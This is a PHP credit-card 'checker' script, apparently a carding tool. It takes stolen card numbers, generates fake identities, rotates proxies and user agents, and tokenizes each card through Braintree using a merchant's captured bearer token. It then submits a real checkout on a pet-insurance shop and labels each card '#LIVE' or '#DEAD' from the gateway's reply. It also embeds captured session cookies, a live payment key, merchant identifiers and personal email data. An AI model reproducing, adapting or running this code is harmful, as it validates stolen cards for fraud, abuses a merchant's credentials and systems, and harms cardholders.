<?php
require 'function.php';
error_reporting(0);

function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$check = str_replace(" " , "", $check);
$i = explode("|", $check);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$cvv = $i[3];

$user_agent = random_ua();
########################SWITCH RANDOM ADDRESS CASE########################
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://www.sayapro.us/fakedata/action.php');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/coo.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/coo.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Connection: keep-alive',
'Cookie: __cfduid=d6b8d2c726075420722c7ff513df3477d1584607104; PHPSESSID=d7937eef4dc28daaa56bbcc685038676; UserLogin=YES; UserHash=de3b9cbcc245125d2e524bf2e2c0f3db; UserEmail=santosdaniel8813%40gmail.com; UserID=585680',
'Host: www.sayapro.us',
'Referer: http://www.sayapro.us/fakedata/'
));
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"telephone":"','"');
$zip = value($resposta, '"zipcode":"','"');
$state = value($resposta, '"state":"','"');
$statecode = value($resposta, '"state_code":"','"');
$email = value($resposta, 'email":"', '"');
$city = value($resposta, '"city":"','"');
$street = value($resposta, '"streetaddress":"','"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="Alaska"){ $state="AK";
}else if($state=="Arizona"){ $state="AR";
}else if($state=="California"){ $state="CA";
}else if($state=="Olorado"){ $state="CO";
}else if($state=="Connecticut"){ $state="CT";
}else if($state=="Delaware"){ $state="DE";
}else if($state=="District of Columbia"){ $state="DC";
}else if($state=="Florida"){ $state="FL";
}else if($state=="Georgia"){ $state="GA";
}else if($state=="Hawaii"){ $state="HI";
}else if($state=="Idaho"){ $state="ID";
}else if($state=="Illinois"){ $state="IL";
}else if($state=="Indiana"){ $state="IN";
}else if($state=="Iowa"){ $state="IA";
}else if($state=="Kansas"){ $state="KS";
}else if($state=="Kentucky"){ $state="KY";
}else if($state=="Louisiana"){ $state="LA";
}else if($state=="Maine"){ $state="ME";
}else if($state=="Maryland"){ $state="MD";
}else if($state=="Massachusetts"){ $state="MA";
}else if($state=="Michigan"){ $state="MI";
}else if($state=="Minnesota"){ $state="MN";
}else if($state=="Mississippi"){ $state="MS";
}else if($state=="Missouri"){ $state="MO";
}else if($state=="Montana"){ $state="MT";
}else if($state=="Nebraska"){ $state="NE";
}else if($state=="Nevada"){ $state="NV";
}else if($state=="New Hampshire"){ $state="NH";
}else if($state=="New Jersey"){ $state="NJ";
}else if($state=="New Mexico"){ $state="NM";
}else if($state=="New York"){ $state="LA";
}else if($state=="North Carolina"){ $state="NC";
}else if($state=="North Dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="Oklahoma"){ $state="OK";
}else if($state=="Oregon"){ $state="OR";
}else if($state=="Pennsylvania"){ $state="PA";
}else if($state=="Rhode Island"){ $state="RI";
}else if($state=="South Carolina"){ $state="SC";
}else if($state=="South Dakota"){ $state="SD";
}else if($state=="Tennessee"){ $state="TN";
}else if($state=="Texas"){ $state="TX";
}else if($state=="Utah"){ $state="UT";
}else if($state=="Vermont"){ $state="VT";
}else if($state=="Virginia"){ $state="VA";
}else if($state=="Washington"){ $state="WA";
}else if($state=="West Virginia"){ $state="WV";
}else if($state=="Wisconsin"){ $state="WI";
}else if($state=="Wyoming"){ $state="WY";
}else{$state="KY";}
########################RANDOM fAKE IDENTITY CASE########################
function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function dadosnome(){
  $nome = file("lista_nomes.txt");
    $mynome = rand(0, sizeof($nome)-1);
    $nome = $nome[$mynome];
  return $nome;
}
function dadossobre(){
  $sobrenome = file("lista_sobrenomes.txt");
    $mysobrenome = rand(0, sizeof($sobrenome)-1);
    $sobrenome = $sobrenome[$mysobrenome];
  return $sobrenome;

}


function email($nome){
  $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
  return $email;
}

$cpf = cpf(1);
$nome = dadosnome();
$sobrenome = dadossobre();
$email = email($nome);
$keys = array(
    1 => 'pk_live_CnOzFerj2LQnpCL8YRTA3QJ7009TqvRgsY',
    ); 
    $key = array_rand($keys);
    $keyStripe = $keys[$key];
########################FUNCTION UNLINK COOKIE CASE########################
if (file_exists(getcwd().'/coo.txt')) {
        unlink(getcwd().'/coo.txt');
    }
########################SWITCH MONTH CASE########################
switch ($mm) {
  case '01':
  $mm = '1';
    break;
  case '02':
  $mm = '2';
    break;
  case '03':
  $mm = '3';
    break;
  case '04':
  $mm = '4';
    break;
  case '05':
  $mm = '5';
    break;
  case '06':
  $mm = '6';
    break;
  case '07':
  $mm = '7';
    break;
  case '08':
  $mm = '8';
    break;
    case '09':
    $mm = '9';
    break;
}



########################SWITCH YEAR CASE########################
switch ($yyyy) {
  case '2019':
  $yyyy = '19';
    break;
  case '2020':
  $yyyy = '20';
    break;
  case '2021':
  $yyyy = '21';
    break;
  case '2022':
  $yyyy = '22';
    break;
  case '2023':
  $yyyy = '23';
    break;
  case '2024':
  $yyyy = '24';
    break;
  case '2025':
  $yyyy = '25';
    break;
  case '2026':
  $yyyy = '26';
    break;
    case '2027':
    $yyyy = '27';
    break;
}
########################FUNCTION RANDOM IP CASE########################
$proxies = explode("<br />", nl2br(trim(file_get_contents('tproxies.txt'))));
$proxy = trim($proxies[array_rand($proxies)]);
########################FUNCTION RANDOM CHARGE########################
$m=rand(1,2);
$debitou=rand(10,60);
############################################################################################################################################
############################################################################################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/coo.txt');
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/coo.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");

$headers = array();
$headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1ODk4NjQxNTUsImp0aSI6ImM3YjFmY2I1LWRkMzUtNDY5NS05ZWJiLWRlNTU3NmRlZDYxOSIsInN1YiI6ImNqanR6ZDRzYzJneDI2cmgiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNqanR6ZDRzYzJneDI2cmgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJtYXJpYW5uZXN0cmFuZ2V5YWhvb2NvdWsifX0.84oVvnr8RqeDJySkZ1XAMh23bO-eci_GstaB3i0GvN8e0mQE8fRmxgkdCe8k0ADR5LP2f1Hw6K3YxLD3rQbIew';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/web/3.59.0/html/hosted-fields-frame.min.html';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"1b4b1269-3184-4ad7-be0d-38eed54b8ba8"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yyyy.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"SO51 3BQ","streetAddress":"19 Argyll Street"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$first = curl_exec($ch);
$token = trim(strip_tags(getStr($first, '"token":"','"')));
############################################################################################################################################
############################################################################################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.protect-mypet.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_FAILONERROR, true);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/coo.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/coo.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Cookie: cookielawinfo-checkbox-non-necessary=yes; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2020-05-05%2019%3A18%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.protect-mypet.com%2Fbasket%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2020-05-05%2019%3A18%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.protect-mypet.com%2Fbasket%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; _hjid=560d7d47-0cf6-4234-9367-c3c6cd5f99e8; wp_automatewoo_visitor_db2cd99f57764c79b2e2d76e365465ff=ize1lj25wwz31mjhpv70; wordpress_logged_in_db2cd99f57764c79b2e2d76e365465ff=lace.loui%7C1589916120%7C0rClh3AFHqITd6xxYOg16zLIvd9hxqgcAG040uNWi74%7C8f1a7631a7b1d7ffb85547f780a83ea61c1cc7bed28a7b3c708dcd7334a8a67f; viewed_cookie_policy=yes; _ga=GA1.2.529269479.1588863247; _fbp=fb.1.1588863285374.240022761; wfwaf-authcookie-17396a408d16851501c72dc12d6af279=3820%7Csubscriber%7Ce2a9c59637c738e339feee01cafd041de0f96b63e0c281dcf29454cdcb9c9cbb; woocommerce_items_in_cart=1; wp_woocommerce_session_db2cd99f57764c79b2e2d76e365465ff=3820%7C%7C1589950473%7C%7C1589946873%7C%7Cbe76c10bc2131a9e284a86b112d90c19; wp_automatewoo_session_started=1; cookielawinfo-checkbox-necessary=yes; sbjs_udata=vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%206.1%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F81.0.4044.138%20Safari%2F537.36; _gid=GA1.2.1332821847.1589777700; _hjIncludedInSample=1; _hjAbsoluteSessionInProgress=1; woocommerce_cart_hash=007433c007c4d89069e6377e3b60f48a; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.protect-mypet.com%2Fcheckout%2F; _gat_gtag_UA_71509010_1=1';
$headers[] = 'Origin: https://www.protect-mypet.com';
$headers[] = 'Referer: https://www.protect-mypet.com/checkout/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name='.$nome.'&billing_last_name='.$sobrenome.'&billing_company=&billing_country=GB&billing_address_1=19+Argyll+Street&billing_address_2=&billing_city=STANBRIDGE+EARLS&billing_state=&billing_postcode=SO51+3BQ&billing_phone=07946000458&billing_email='.$email.'&_mc4wp_subscribe_woocommerce=0&shipping_first_name=Minnie&shipping_last_name=Hogan&shipping_company=&shipping_country=GB&shipping_address_1=44+Fraserburgh+Rd&shipping_address_2=&shipping_city=LINN+OF+MUICK+COTTAGE&shipping_state=&shipping_postcode=AB35+6HS&metorik_source_type=typein&metorik_source_url=(none)&metorik_source_mtke=(none)&metorik_source_utm_campaign=(none)&metorik_source_utm_source=(direct)&metorik_source_utm_medium=(none)&metorik_source_utm_content=(none)&metorik_source_utm_id=(none)&metorik_source_utm_term=(none)&metorik_source_session_entry=https%3A%2F%2Fwww.protect-mypet.com%2Fbasket%2F&metorik_source_session_start_time=2020-05-05+19%3A18%3A22&metorik_source_session_pages=3&metorik_source_session_count=3&shipping_method%5B0%5D=free_shipping%3A4&shipping_method%5B2020_06_18_monthly_0%5D=free_shipping%3A4&payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%22c7a390c0ce5415bff2affdf13e1e5508%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2290ae2cc5093c68af6a820affd2d9ec01%22%7D&braintree_cc_payment_type=nonce&wc_braintree_3ds_enabled=&wc_braintree_3ds_active=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fcjjtzd4sc2gx26rh%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fcjjtzd4sc2gx26rh%22%7D%2C%22merchantId%22%3A%22cjjtzd4sc2gx26rh%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2MjRhNDgwZC1hMWRmLTQyMDktOGQwNy0wN2YzYjY1YmFmMzMiLCJpYXQiOjE1ODk3Nzc3NjQsImV4cCI6MTU4OTc4NDk2NCwiaXNzIjoiNWM4OTYxMWI4MjNjMTYyZGMwM2E4YTBlIiwiT3JnVW5pdElkIjoiNWM4OTYxMWE4MjNjMTYyZGMwM2E4YTBiIn0.H22_ss_VI893ep_Kq5G3qB87kqV4k62CKigHFpnGLDY%22%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Protect+My+Pet%22%2C%22clientId%22%3A%22AQ5Pzl51xPu3slQeVnbaGJV0RmoE7onSX_ouI5aLnLf4MdcOZ8XX5WWjgECsVCE-UzXj0ujQSJ5-4wBm%22%2C%22privacyUrl%22%3A%22http%3A%2F%2Fprotect-mypet.com%2Fprivacy%22%2C%22userAgreementUrl%22%3A%22http%3A%2F%2Fprotect-mypet.com%2Fterms%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22mariannestrangeyahoocouk%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&braintree_cc_token_key=b99sqzd&braintree_paypal_nonce_key=&braintree_paypal_device_data=&vmd_complicance=1&woocommerce-process-checkout-nonce=3d2ad3d4c1&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');

$second = curl_exec($ch);
$err = curl_error($ch);
$err = curl_errno($ch);
$message = trim(strip_tags(getStr($second, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tThere was an error processing your payment. Reason: ','\t\t<\/li>\n\t<\/ul>\n<input type=\"hidden\" id=\"wc_braintree_checkout_error\" value=\"true\" \/>"')));
########################FUNCTION BIN LIST#############################
$bin = substr($cc, 0, 6);
    $file = 'bins.csv';
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";

    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }

    $pieces = explode(";", $encontrada);
    $c = count($pieces);

    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];

    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
#================================================================CONDITION RESPONSE========================================================#
if (strpos($second, "There was an error processing your payment. Reason: Gateway Rejected avs")){
echo '<p><span class="badge badge-success">#LIVE</span> : <span class="badge badge-primary">'.$cc.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> : <span class="badge badge-info">SECURITY CODE IS MATCHED!</span> : <span class="badge badge-dark">BIN: '.$banco.'</span> : <span class="badge badge-warning">GATE1</span></p>';
}
elseif (strpos($second, "Sorry, your session has expired.")){
echo '<p><span class="badge badge-danger">#DEAD</span> : <span class="badge badge-primary">'.$cc.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> : <span class="badge badge-info">CHECKER ERROR!</span> : <span class="badge badge-warning">GATE1</span></p>';
}
elseif($err){
echo '<p><span class="badge badge-danger">#DEAD</span> : <span class="badge badge-primary">'.$cc.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> : <span class="badge badge-info">DEAD PROXY!</span> : <span class="badge badge-warning">GATE1</span></p>';
}else{
echo '<p><span class="badge badge-danger">#DEAD</span> : <span class="badge badge-primary">'.$cc.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> : <span class="badge badge-info">'.$message.'</span> : <span class="badge badge-dark">BIN: '.$banco.'</span> : <span class="badge badge-warning">GATE1</span></p>';
}
curl_close($ch);
ob_flush();
sleep(1);
?>